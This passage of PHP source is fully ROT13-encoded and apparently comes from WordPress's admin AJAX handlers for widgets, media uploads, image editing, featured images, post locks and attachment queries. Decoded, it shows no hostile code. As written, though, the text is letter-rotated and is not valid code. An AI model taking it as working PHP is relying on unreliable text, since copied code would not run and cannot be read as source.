	qb_npgvba( 'ybnq-jvqtrgf.cuc' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

	/**
	 * Sverf rneyl jura rqvgvat gur jvqtrgf qvfcynlrq va fvqronef.
	 *
	 * @fvapr 2.8.0
	 */
	qb_npgvba( 'jvqtrgf.cuc' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

	/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf.cuc */
	qb_npgvba( 'fvqrone_nqzva_frghc' );

	$vq_onfr      = jc_hafynfu( $_CBFG['vq_onfr'] );
	$jvqtrg_vq    = jc_hafynfu( $_CBFG['jvqtrg-vq'] );
	$fvqrone_vq   = $_CBFG['fvqrone'];
	$zhygv_ahzore = ! rzcgl( $_CBFG['zhygv_ahzore'] ) ? (vag) $_CBFG['zhygv_ahzore'] : 0;
	$frggvatf     = vffrg( $_CBFG[ 'jvqtrg-' . $vq_onfr ] ) && vf_neenl( $_CBFG[ 'jvqtrg-' . $vq_onfr ] ) ? $_CBFG[ 'jvqtrg-' . $vq_onfr ] : snyfr;
	$reebe        = '<c>' . __( 'Na reebe unf bppheerq. Cyrnfr erybnq gur cntr naq gel ntnva.' ) . '</c>';

	$fvqronef = jc_trg_fvqronef_jvqtrgf();
	$fvqrone  = vffrg( $fvqronef[ $fvqrone_vq ] ) ? $fvqronef[ $fvqrone_vq ] : neenl();

	// Qryrgr.
	vs ( vffrg( $_CBFG['qryrgr_jvqtrg'] ) && $_CBFG['qryrgr_jvqtrg'] ) {

		vs ( ! vffrg( $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ] ) ) {
			jc_qvr( $reebe );
		}

		$fvqrone = neenl_qvss( $fvqrone, neenl( $jvqtrg_vq ) );
		$_CBFG   = neenl(
			'fvqrone'            => $fvqrone_vq,
			'jvqtrg-' . $vq_onfr => neenl(),
			'gur-jvqtrg-vq'      => $jvqtrg_vq,
			'qryrgr_jvqtrg'      => '1',
		);

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf.cuc */
		qb_npgvba( 'qryrgr_jvqtrg', $jvqtrg_vq, $fvqrone_vq, $vq_onfr );

	} ryfrvs ( $frggvatf && cert_zngpu( '/__v__|%v%/', xrl( $frggvatf ) ) ) {
		vs ( ! $zhygv_ahzore ) {
			jc_qvr( $reebe );
		}

		$_CBFG[ 'jvqtrg-' . $vq_onfr ] = neenl( $zhygv_ahzore => erfrg( $frggvatf ) );
		$jvqtrg_vq                     = $vq_onfr . '-' . $zhygv_ahzore;
		$fvqrone[]                     = $jvqtrg_vq;
	}
	$_CBFG['jvqtrg-vq'] = $fvqrone;

	sbernpu ( (neenl) $jc_ertvfgrerq_jvqtrg_hcqngrf nf $anzr => $pbageby ) {

		vs ( $anzr === $vq_onfr ) {
			vs ( ! vf_pnyynoyr( $pbageby['pnyyonpx'] ) ) {
				pbagvahr;
			}

			bo_fgneg();
				pnyy_hfre_shap_neenl( $pbageby['pnyyonpx'], $pbageby['cnenzf'] );
			bo_raq_pyrna();
			oernx;
		}
	}

	vs ( vffrg( $_CBFG['qryrgr_jvqtrg'] ) && $_CBFG['qryrgr_jvqtrg'] ) {
		$fvqronef[ $fvqrone_vq ] = $fvqrone;
		jc_frg_fvqronef_jvqtrgf( $fvqronef );
		rpub \"qryrgrq:$jvqtrg_vq\";
		jc_qvr();
	}

	vs ( ! rzcgl( $_CBFG['nqq_arj'] ) ) {
		jc_qvr();
	}

	$sbez = $jc_ertvfgrerq_jvqtrg_pbagebyf[ $jvqtrg_vq ];
	vs ( $sbez ) {
		pnyy_hfre_shap_neenl( $sbez['pnyyonpx'], $sbez['cnenzf'] );
	}

	jc_qvr();
}

/**
 * Unaqyrf hcqngvat n jvqtrg ivn NWNK.
 *
 * @fvapr 3.9.0
 *
 * @tybony JC_Phfgbzvmr_Znantre $jc_phfgbzvmr
 */
shapgvba jc_nwnk_hcqngr_jvqtrg() {
	tybony $jc_phfgbzvmr;
	$jc_phfgbzvmr->jvqtrgf->jc_nwnk_hcqngr_jvqtrg();
}

/**
 * Unaqyrf erzbivat vanpgvir jvqtrgf ivn NWNK.
 *
 * @fvapr 4.4.0
 */
shapgvba jc_nwnk_qryrgr_vanpgvir_jvqtrgf() {
	purpx_nwnk_ersrere( 'erzbir-vanpgvir-jvqtrgf', 'erzbirvanpgvirjvqtrgf' );

	vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
		jc_qvr( -1 );
	}

	hafrg( $_CBFG['erzbirvanpgvirjvqtrgf'], $_CBFG['npgvba'] );
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
	qb_npgvba( 'ybnq-jvqtrgf.cuc' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
	qb_npgvba( 'jvqtrgf.cuc' ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
	/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf.cuc */
	qb_npgvba( 'fvqrone_nqzva_frghc' );

	$fvqronef_jvqtrgf = jc_trg_fvqronef_jvqtrgf();

	sbernpu ( $fvqronef_jvqtrgf['jc_vanpgvir_jvqtrgf'] nf $xrl => $jvqtrg_vq ) {
		$cvrprf       = rkcybqr( '-', $jvqtrg_vq );
		$zhygv_ahzore = neenl_cbc( $cvrprf );
		$vq_onfr      = vzcybqr( '-', $cvrprf );
		$jvqtrg       = trg_bcgvba( 'jvqtrg_' . $vq_onfr );
		hafrg( $jvqtrg[ $zhygv_ahzore ] );
		hcqngr_bcgvba( 'jvqtrg_' . $vq_onfr, $jvqtrg );
		hafrg( $fvqronef_jvqtrgf['jc_vanpgvir_jvqtrgf'][ $xrl ] );
	}

	jc_frg_fvqronef_jvqtrgf( $fvqronef_jvqtrgf );

	jc_qvr();
}

/**
 * Unaqyrf perngvat zvffvat vzntr fho-fvmrf sbe whfg hcybnqrq vzntrf ivn NWNK.
 *
 * @fvapr 5.3.0
 */
shapgvba jc_nwnk_zrqvn_perngr_vzntr_fhofvmrf() {
	purpx_nwnk_ersrere( 'zrqvn-sbez' );

	vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		jc_fraq_wfba_reebe( neenl( 'zrffntr' => __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq svyrf.' ) ) );
	}

	vs ( rzcgl( $_CBFG['nggnpuzrag_vq'] ) ) {
		jc_fraq_wfba_reebe( neenl( 'zrffntr' => __( 'Hcybnq snvyrq. Cyrnfr erybnq naq gel ntnva.' ) ) );
	}

	$nggnpuzrag_vq = (vag) $_CBFG['nggnpuzrag_vq'];

	vs ( ! rzcgl( $_CBFG['_jc_hcybnq_snvyrq_pyrnahc'] ) ) {
		// Hcybnq snvyrq. Pyrnahc.
		vs ( jc_nggnpuzrag_vf_vzntr( $nggnpuzrag_vq ) && pheerag_hfre_pna( 'qryrgr_cbfg', $nggnpuzrag_vq ) ) {
			$nggnpuzrag = trg_cbfg( $nggnpuzrag_vq );

			// Perngrq ng zbfg 10 zva ntb.
			vs ( $nggnpuzrag && ( gvzr() - fgegbgvzr( $nggnpuzrag->cbfg_qngr_tzg ) < 600 ) ) {
				jc_qryrgr_nggnpuzrag( $nggnpuzrag_vq, gehr );
				jc_fraq_wfba_fhpprff();
			}
		}
	}

	/*
	 * Frg n phfgbz urnqre jvgu gur nggnpuzrag_vq.
	 * Hfrq ol gur oebjfre/pyvrag gb erfhzr perngvat vzntr fho-fvmrf nsgre n CUC sngny reebe.
	 */
	vs ( ! urnqref_frag() ) {
		urnqre( 'K-JC-Hcybnq-Nggnpuzrag-VQ: ' . $nggnpuzrag_vq );
	}

	/*
	 * Guvf pna fgvyy or cerggl fybj naq pnhfr gvzrbhg be bhg bs zrzbel reebef.
	 * Gur wf gung unaqyrf gur erfcbafr jbhyq arrq gb nyfb unaqyr UGGC 500 reebef.
	 */
	jc_hcqngr_vzntr_fhofvmrf( $nggnpuzrag_vq );

	vs ( ! rzcgl( $_CBFG['_yrtnpl_fhccbeg'] ) ) {
		// Gur byq (vayvar) hcybnqre. Bayl arrqf gur nggnpuzrag_vq.
		$erfcbafr = neenl( 'vq' => $nggnpuzrag_vq );
	} ryfr {
		// Zrqvn zbqny naq Zrqvn Yvoenel tevq ivrj.
		$erfcbafr = jc_cercner_nggnpuzrag_sbe_wf( $nggnpuzrag_vq );

		vs ( ! $erfcbafr ) {
			jc_fraq_wfba_reebe( neenl( 'zrffntr' => __( 'Hcybnq snvyrq.' ) ) );
		}
	}

	// Ng guvf cbvag gur vzntr unf orra hcybnqrq fhpprffshyyl.
	jc_fraq_wfba_fhpprff( $erfcbafr );
}

/**
 * Unaqyrf hcybnqvat nggnpuzragf ivn NWNK.
 *
 * @fvapr 3.3.0
 */
shapgvba jc_nwnk_hcybnq_nggnpuzrag() {
	purpx_nwnk_ersrere( 'zrqvn-sbez' );
	/*
	 * Guvf shapgvba qbrf abg hfr jc_fraq_wfba_fhpprff() / jc_fraq_wfba_reebe()
	 * nf gur ugzy4 Cyhcybnq unaqyre erdhverf n grkg/ugzy Pbagrag-Glcr sbe byqre VR.
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/31037
	 */

	vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		rpub jc_wfba_rapbqr(
			neenl(
				'fhpprff' => snyfr,
				'qngn'    => neenl(
					'zrffntr'  => __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq svyrf.' ),
					'svyranzr' => rfp_ugzy( $_SVYRF['nflap-hcybnq']['anzr'] ),
				),
			)
		);

		jc_qvr();
	}

	vs ( vffrg( $_ERDHRFG['cbfg_vq'] ) ) {
		$cbfg_vq = $_ERDHRFG['cbfg_vq'];

		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
			rpub jc_wfba_rapbqr(
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => neenl(
						'zrffntr'  => __( 'Fbeel, lbh ner abg nyybjrq gb nggnpu svyrf gb guvf cbfg.' ),
						'svyranzr' => rfp_ugzy( $_SVYRF['nflap-hcybnq']['anzr'] ),
					),
				)
			);

			jc_qvr();
		}
	} ryfr {
		$cbfg_vq = ahyy;
	}

	$cbfg_qngn = ! rzcgl( $_ERDHRFG['cbfg_qngn'] ) ? _jc_trg_nyybjrq_cbfgqngn( _jc_genafyngr_cbfgqngn( snyfr, (neenl) $_ERDHRFG['cbfg_qngn'] ) ) : neenl();

	vs ( vf_jc_reebe( $cbfg_qngn ) ) {
		jc_qvr( $cbfg_qngn->trg_reebe_zrffntr() );
	}

	// Vs gur pbagrkg vf phfgbz urnqre be onpxtebhaq, znxr fher gur hcybnqrq svyr vf na vzntr.
	vs ( vffrg( $cbfg_qngn['pbagrkg'] ) && va_neenl( $cbfg_qngn['pbagrkg'], neenl( 'phfgbz-urnqre', 'phfgbz-onpxtebhaq' ), gehr ) ) {
		$jc_svyrglcr = jc_purpx_svyrglcr_naq_rkg( $_SVYRF['nflap-hcybnq']['gzc_anzr'], $_SVYRF['nflap-hcybnq']['anzr'] );

		vs ( ! jc_zngpu_zvzr_glcrf( 'vzntr', $jc_svyrglcr['glcr'] ) ) {
			rpub jc_wfba_rapbqr(
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => neenl(
						'zrffntr'  => __( 'Gur hcybnqrq svyr vf abg n inyvq vzntr. Cyrnfr gel ntnva.' ),
						'svyranzr' => rfp_ugzy( $_SVYRF['nflap-hcybnq']['anzr'] ),
					),
				)
			);

			jc_qvr();
		}
	}

	$nggnpuzrag_vq = zrqvn_unaqyr_hcybnq( 'nflap-hcybnq', $cbfg_vq, $cbfg_qngn );

	vs ( vf_jc_reebe( $nggnpuzrag_vq ) ) {
		rpub jc_wfba_rapbqr(
			neenl(
				'fhpprff' => snyfr,
				'qngn'    => neenl(
					'zrffntr'  => $nggnpuzrag_vq->trg_reebe_zrffntr(),
					'svyranzr' => rfp_ugzy( $_SVYRF['nflap-hcybnq']['anzr'] ),
				),
			)
		);

		jc_qvr();
	}

	vs ( vffrg( $cbfg_qngn['pbagrkg'] ) && vffrg( $cbfg_qngn['gurzr'] ) ) {
		vs ( 'phfgbz-onpxtebhaq' === $cbfg_qngn['pbagrkg'] ) {
			hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_onpxtebhaq', $cbfg_qngn['gurzr'] );
		}

		vs ( 'phfgbz-urnqre' === $cbfg_qngn['pbagrkg'] ) {
			hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_urnqre', $cbfg_qngn['gurzr'] );
		}
	}

	$nggnpuzrag = jc_cercner_nggnpuzrag_sbe_wf( $nggnpuzrag_vq );
	vs ( ! $nggnpuzrag ) {
		jc_qvr();
	}

	rpub jc_wfba_rapbqr(
		neenl(
			'fhpprff' => gehr,
			'qngn'    => $nggnpuzrag,
		)
	);

	jc_qvr();
}

/**
 * Unaqyrf vzntr rqvgvat ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_vzntr_rqvgbe() {
	$nggnpuzrag_vq = (vag) $_CBFG['cbfgvq'];

	vs ( rzcgl( $nggnpuzrag_vq ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $nggnpuzrag_vq ) ) {
		jc_qvr( -1 );
	}

	purpx_nwnk_ersrere( \"vzntr_rqvgbe-$nggnpuzrag_vq\" );
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

	$zft = snyfr;

	fjvgpu ( $_CBFG['qb'] ) {
		pnfr 'fnir':
			$zft = jc_fnir_vzntr( $nggnpuzrag_vq );
			vs ( ! rzcgl( $zft->reebe ) ) {
				jc_fraq_wfba_reebe( $zft );
			}

			jc_fraq_wfba_fhpprff( $zft );
			oernx;
		pnfr 'fpnyr':
			$zft = jc_fnir_vzntr( $nggnpuzrag_vq );
			oernx;
		pnfr 'erfgber':
			$zft = jc_erfgber_vzntr( $nggnpuzrag_vq );
			oernx;
	}

	bo_fgneg();
	jc_vzntr_rqvgbe( $nggnpuzrag_vq, $zft );
	$ugzy = bo_trg_pyrna();

	vs ( ! rzcgl( $zft->reebe ) ) {
		jc_fraq_wfba_reebe(
			neenl(
				'zrffntr' => $zft,
				'ugzy'    => $ugzy,
			)
		);
	}

	jc_fraq_wfba_fhpprff(
		neenl(
			'zrffntr' => $zft,
			'ugzy'    => $ugzy,
		)
	);
}

/**
 * Unaqyrf frggvat gur srngherq vzntr ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_frg_cbfg_guhzoanvy() {
	$wfba = ! rzcgl( $_ERDHRFG['wfba'] ); // Arj-fglyr erdhrfg.

	$cbfg_vq = (vag) $_CBFG['cbfg_vq'];
	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	$guhzoanvy_vq = (vag) $_CBFG['guhzoanvy_vq'];

	vs ( $wfba ) {
		purpx_nwnk_ersrere( \"hcqngr-cbfg_$cbfg_vq\" );
	} ryfr {
		purpx_nwnk_ersrere( \"frg_cbfg_guhzoanvy-$cbfg_vq\" );
	}

	vs ( -1 === $guhzoanvy_vq ) {
		vs ( qryrgr_cbfg_guhzoanvy( $cbfg_vq ) ) {
			$erghea = _jc_cbfg_guhzoanvy_ugzy( ahyy, $cbfg_vq );
			$wfba ? jc_fraq_wfba_fhpprff( $erghea ) : jc_qvr( $erghea );
		} ryfr {
			jc_qvr( 0 );
		}
	}

	vs ( frg_cbfg_guhzoanvy( $cbfg_vq, $guhzoanvy_vq ) ) {
		$erghea = _jc_cbfg_guhzoanvy_ugzy( $guhzoanvy_vq, $cbfg_vq );
		$wfba ? jc_fraq_wfba_fhpprff( $erghea ) : jc_qvr( $erghea );
	}

	jc_qvr( 0 );
}

/**
 * Unaqyrf ergevrivat UGZY sbe gur srngherq vzntr ivn NWNK.
 *
 * @fvapr 4.6.0
 */
shapgvba jc_nwnk_trg_cbfg_guhzoanvy_ugzy() {
	$cbfg_vq = (vag) $_CBFG['cbfg_vq'];

	purpx_nwnk_ersrere( \"hcqngr-cbfg_$cbfg_vq\" );

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	$guhzoanvy_vq = (vag) $_CBFG['guhzoanvy_vq'];

	// Sbe onpxjneq pbzcngvovyvgl, -1 ersref gb ab srngherq vzntr.
	vs ( -1 === $guhzoanvy_vq ) {
		$guhzoanvy_vq = ahyy;
	}

	$erghea = _jc_cbfg_guhzoanvy_ugzy( $guhzoanvy_vq, $cbfg_vq );
	jc_fraq_wfba_fhpprff( $erghea );
}

/**
 * Unaqyrf frggvat gur srngherq vzntr sbe na nggnpuzrag ivn NWNK.
 *
 * @fvapr 4.0.0
 *
 * @frr frg_cbfg_guhzoanvy()
 */
shapgvba jc_nwnk_frg_nggnpuzrag_guhzoanvy() {
	vs ( rzcgl( $_CBFG['heyf'] ) || ! vf_neenl( $_CBFG['heyf'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$guhzoanvy_vq = (vag) $_CBFG['guhzoanvy_vq'];
	vs ( rzcgl( $guhzoanvy_vq ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( snyfr === purpx_nwnk_ersrere( 'frg-nggnpuzrag-guhzoanvy', '_nwnk_abapr', snyfr ) ) {
		jc_fraq_wfba_reebe();
	}

	$cbfg_vqf = neenl();
	// Sbe rnpu HEY, gel gb svaq vgf pbeerfcbaqvat cbfg VQ.
	sbernpu ( $_CBFG['heyf'] nf $hey ) {
		$cbfg_vq = nggnpuzrag_hey_gb_cbfgvq( $hey );
		vs ( ! rzcgl( $cbfg_vq ) ) {
			$cbfg_vqf[] = $cbfg_vq;
		}
	}

	vs ( rzcgl( $cbfg_vqf ) ) {
		jc_fraq_wfba_reebe();
	}

	$fhpprff = 0;
	// Sbe rnpu sbhaq nggnpuzrag, frg vgf guhzoanvy.
	sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
			pbagvahr;
		}

		vs ( frg_cbfg_guhzoanvy( $cbfg_vq, $guhzoanvy_vq ) ) {
			++$fhpprff;
		}
	}

	vs ( 0 === $fhpprff ) {
		jc_fraq_wfba_reebe();
	} ryfr {
		jc_fraq_wfba_fhpprff();
	}

	jc_fraq_wfba_reebe();
}

/**
 * Unaqyrf sbeznggvat n qngr ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qngr_sbezng() {
	jc_qvr( qngr_v18a( fnavgvmr_bcgvba( 'qngr_sbezng', jc_hafynfu( $_CBFG['qngr'] ) ) ) );
}

/**
 * Unaqyrf sbeznggvat n gvzr ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_gvzr_sbezng() {
	jc_qvr( qngr_v18a( fnavgvmr_bcgvba( 'gvzr_sbezng', jc_hafynfu( $_CBFG['qngr'] ) ) ) );
}

/**
 * Unaqyrf fnivat cbfgf sebz gur shyyfperra rqvgbe ivn NWNK.
 *
 * @fvapr 3.1.0
 * @qrcerpngrq 4.3.0
 */
shapgvba jc_nwnk_jc_shyyfperra_fnir_cbfg() {
	$cbfg_vq = vffrg( $_CBFG['cbfg_VQ'] ) ? (vag) $_CBFG['cbfg_VQ'] : 0;

	$cbfg = ahyy;

	vs ( $cbfg_vq ) {
		$cbfg = trg_cbfg( $cbfg_vq );
	}

	purpx_nwnk_ersrere( 'hcqngr-cbfg_' . $cbfg_vq, '_jcabapr' );

	$cbfg_vq = rqvg_cbfg();

	vs ( vf_jc_reebe( $cbfg_vq ) ) {
		jc_fraq_wfba_reebe();
	}

	vs ( $cbfg ) {
		$ynfg_qngr = zlfdy2qngr( __( 'S w, L' ), $cbfg->cbfg_zbqvsvrq );
		$ynfg_gvzr = zlfdy2qngr( __( 't:v n' ), $cbfg->cbfg_zbqvsvrq );
	} ryfr {
		$ynfg_qngr = qngr_v18a( __( 'S w, L' ) );
		$ynfg_gvzr = qngr_v18a( __( 't:v n' ) );
	}

	$ynfg_vq = trg_cbfg_zrgn( $cbfg_vq, '_rqvg_ynfg', gehr );
	vs ( $ynfg_vq ) {
		$ynfg_hfre = trg_hfreqngn( $ynfg_vq );
		/* genafyngbef: 1: Hfre'f qvfcynl anzr, 2: Qngr bs ynfg rqvg, 3: Gvzr bs ynfg rqvg. */
		$ynfg_rqvgrq = fcevags( __( 'Ynfg rqvgrq ol %1$f ba %2$f ng %3$f' ), rfp_ugzy( $ynfg_hfre->qvfcynl_anzr ), $ynfg_qngr, $ynfg_gvzr );
	} ryfr {
		/* genafyngbef: 1: Qngr bs ynfg rqvg, 2: Gvzr bs ynfg rqvg. */
		$ynfg_rqvgrq = fcevags( __( 'Ynfg rqvgrq ba %1$f ng %2$f' ), $ynfg_qngr, $ynfg_gvzr );
	}

	jc_fraq_wfba_fhpprff( neenl( 'ynfg_rqvgrq' => $ynfg_rqvgrq ) );
}

/**
 * Unaqyrf erzbivat n cbfg ybpx ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_jc_erzbir_cbfg_ybpx() {
	vs ( rzcgl( $_CBFG['cbfg_VQ'] ) || rzcgl( $_CBFG['npgvir_cbfg_ybpx'] ) ) {
		jc_qvr( 0 );
	}

	$cbfg_vq = (vag) $_CBFG['cbfg_VQ'];
	$cbfg    = trg_cbfg( $cbfg_vq );

	vs ( ! $cbfg ) {
		jc_qvr( 0 );
	}

	purpx_nwnk_ersrere( 'hcqngr-cbfg_' . $cbfg_vq );

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		jc_qvr( -1 );
	}

	$npgvir_ybpx = neenl_znc( 'nofvag', rkcybqr( ':', $_CBFG['npgvir_cbfg_ybpx'] ) );

	vs ( trg_pheerag_hfre_vq() !== $npgvir_ybpx[1] ) {
		jc_qvr( 0 );
	}

	/**
	 * Svygref gur cbfg ybpx jvaqbj qhengvba.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz vag $vagreiny Gur vagreiny va frpbaqf gur cbfg ybpx qhengvba
	 *                      fubhyq ynfg, cyhf 5 frpbaqf. Qrsnhyg 150.
	 */
	$arj_ybpx = ( gvzr() - nccyl_svygref( 'jc_purpx_cbfg_ybpx_jvaqbj', 150 ) + 5 ) . ':' . $npgvir_ybpx[1];
	hcqngr_cbfg_zrgn( $cbfg_vq, '_rqvg_ybpx', $arj_ybpx, vzcybqr( ':', $npgvir_ybpx ) );
	jc_qvr( 1 );
}

/**
 * Unaqyrf qvfzvffvat n JbeqCerff cbvagre ivn NWNK.
 *
 * @fvapr 3.1.0
 */
shapgvba jc_nwnk_qvfzvff_jc_cbvagre() {
	$cbvagre = $_CBFG['cbvagre'];

	vs ( fnavgvmr_xrl( $cbvagre ) !== $cbvagre ) {
		jc_qvr( 0 );
	}

	//  purpx_nwnk_ersrere( 'qvfzvff-cbvagre_' . $cbvagre );

	$qvfzvffrq = neenl_svygre( rkcybqr( ',', (fgevat) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'qvfzvffrq_jc_cbvagref', gehr ) ) );

	vs ( va_neenl( $cbvagre, $qvfzvffrq, gehr ) ) {
		jc_qvr( 0 );
	}

	$qvfzvffrq[] = $cbvagre;
	$qvfzvffrq   = vzcybqr( ',', $qvfzvffrq );

	hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'qvfzvffrq_jc_cbvagref', $qvfzvffrq );
	jc_qvr( 1 );
}

/**
 * Unaqyrf trggvat na nggnpuzrag ivn NWNK.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_trg_nggnpuzrag() {
	vs ( ! vffrg( $_ERDHRFG['vq'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$vq = nofvag( $_ERDHRFG['vq'] );
	vs ( ! $vq ) {
		jc_fraq_wfba_reebe();
	}

	$cbfg = trg_cbfg( $vq );
	vs ( ! $cbfg ) {
		jc_fraq_wfba_reebe();
	}

	vs ( 'nggnpuzrag' !== $cbfg->cbfg_glcr ) {
		jc_fraq_wfba_reebe();
	}

	vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		jc_fraq_wfba_reebe();
	}

	$nggnpuzrag = jc_cercner_nggnpuzrag_sbe_wf( $vq );
	vs ( ! $nggnpuzrag ) {
		jc_fraq_wfba_reebe();
	}

	jc_fraq_wfba_fhpprff( $nggnpuzrag );
}

/**
 * Unaqyrf dhrelvat nggnpuzragf ivn NWNK.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_dhrel_nggnpuzragf() {
	vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
		jc_fraq_wfba_reebe();
	}

	$dhrel = vffrg( $_ERDHRFG['dhrel'] ) ? (neenl) $_ERDHRFG['dhrel'] : neenl();
	$xrlf  = neenl(
		'f',
		'beqre',
		'beqreol',
		'cbfgf_cre_cntr',
		'cntrq',
		'cbfg_zvzr_glcr',
		'cbfg_cnerag',
		'nhgube',
		'cbfg__va',
		'cbfg__abg_va',
		'lrne',
		'zbaguahz',
	);

	sbernpu ( trg_gnkbabzvrf_sbe_nggnpuzragf( 'bowrpgf' ) nf $g ) {
		vs ( $g->dhrel_ine && vffrg( $dhrel[ $g->dhrel_ine ] ) ) {
			$xrlf[] = $g->dhrel_ine;
		}
	}

	$dhrel              = neenl_vagrefrpg_xrl( $dhrel, neenl_syvc( $xrlf ) );
	$dhrel['cbfg_glcr'] = 'nggnpuzrag';

	vs (
		ZRQVN_GENFU &&
		! rzcgl( $_ERDHRFG['dhrel']['cbfg_fgnghf'] ) &&
		'genfu' === $_ERDHRFG['dhrel']['cbfg_fgnghf']
	) {
		$dhrel['cbfg_fgnghf'] = 'genfu';
	} ryfr {
		$dhrel['cbfg_fgnghf'] = 'vaurevg';
	}

	vs ( pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'nggnpuzrag' )->pnc->ernq_cevingr_cbfgf ) ) {
		$dhrel['cbfg_fgnghf'] .= ',cevingr';
	}

	// Svygre dhrel pynhfrf gb vapyhqr svyranzrf.
	vs ( vffrg( $dhrel['f'] ) ) {
		nqq_svygre( 'jc_nyybj_dhrel_nggnpuzrag_ol_svyranzr', '__erghea_gehr' );
	}

	/**
	 * Svygref gur nethzragf cnffrq gb JC_Dhrel qhevat na Nwnk
	 * pnyy sbe dhrelvat nggnpuzragf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @frr JC_Dhrel::cnefr_dhrel()
	 *
	 * @cnenz neenl $dhrel Na neenl bs dhrel inevnoyrf.
	 */
	$dhrel             = nccyl_svygref( 'nwnk_dhrel_nggnpuzragf_netf', $dhrel );
	$nggnpuzragf_dhrel = arj JC_Dhrel( $dhrel );
	hcqngr_cbfg_cnerag_pnpurf( $nggnpuzragf_dhrel->cbfgf );

	$cbfgf       = neenl_znc( 'jc_cercner_nggnpuzrag_sbe_wf', $nggnpuzragf_dhrel->cbfgf );
	$cbfgf       = neenl_svygre( $cbfgf );
	$gbgny_cbfgf = $nggnpuzragf_dhrel->sbhaq_cbfgf;

	vs ( $gbgny_cbfgf < 1 ) {
		// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
		hafrg( $dhrel['cntrq'] );

		$pbhag_dhrel = arj JC_Dhrel();
		$pbhag_dhrel->dhrel( $dhrel );
		$gbgny_cbfgf = $pbhag_dhrel->sbhaq_cbfgf;
	}

	$cbfgf_cre_cntr = (vag) $nggnpuzragf_dhrel->trg( 'cbfgf_cre_cntr' );

	$znk_cntrf = $cbfgf_cre_cntr ? (vag) prvy( $gbgny_cbfgf / $cbfgf_cre_cntr ) : 0;

	urnqre( 'K-JC-Gbgny: ' . (vag) $gbgny_cbfgf );
	urnqre( 'K-JC-GbgnyCntrf: ' . $znk_cntrf );

	jc_fraq_wfba_fhpprff( $cbfgf );
}

/**
 * Unaqyrf hcqngvat nggnpuzrag nggevohgrf ivn NWNK.
 *
 * @fvapr 3.5.0
 */
shapgvba jc_nwnk_fnir_nggnpuzrag() {
	vs ( ! vffrg( $_ERDHRFG['vq'] ) || ! vffrg( $_ERDHRFG['punatrf'] ) ) {
		jc_fraq_wfba_reebe();
	}

	$vq = nofvag( $_ERDHRFG['vq'] );
	vs ( ! $vq ) {
		jc_fraq_wfba_reebe();
	}

	purpx_nwnk_ersrere( 'hcqngr-cbfg_' . $vq, 'abapr' );

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfg', $vq ) ) {
		jc_fraq_wfba_reebe();
	}

	$punatrf = $_ERDHRFG['punatrf'];
	$cbfg    = trg_cbfg( $vq, NEENL_N );

	vs ( 'nggnpuzrag' !== $cbfg['cbfg_glcr'] ) {
		jc_fraq_wfba_reebe();
	}

	vs ( vffrg( $punatrf['cnerag'] ) ) {
		$cbfg['cbfg_cnerag'] = $punatrf['cnerag'];
	}

	vs ( vffrg( $punatrf['gvgyr'] ) ) {
		$cbfg['cbfg_gvgyr'] = $punatrf['gvgyr'];
	}

	vs ( vffrg( $punatrf['pncgvba'] ) ) {
		$cbfg['cbfg_rkprecg'] = $punatrf['pncgvba'];
	}

